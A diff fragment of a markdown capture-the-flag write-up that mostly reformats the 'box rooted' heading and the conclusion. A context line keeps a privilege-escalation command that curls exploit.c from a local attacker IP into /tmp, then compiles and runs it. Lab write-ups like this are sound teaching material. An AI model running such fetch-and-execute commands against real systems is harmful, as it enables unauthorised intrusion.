@@ -157,9 +157,9 @@ cd /tmp && id && curl 192.168.0.213/exploit.c -o exploit.c 2> /dev/null && gcc e
 -
 > ./a.out - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)
 
-# Congratulations! The box has been rooted!
+## <centre>Congratulations! The box has been rooted!</centre>
 
-## Conclusion
+# Conclusion
 A solid box with a lot of hidden knowledge for new people entering infosec community. There are always things to learn no matter how you many times you do them - same with this box. Personally I found this challenge quite easy, but enjoyed it non the less. My thanks goes to the creator for making such an awesome box.
 -
 Have any suggestions or feedback? Write it down below in the comments or send me a message on twitter!
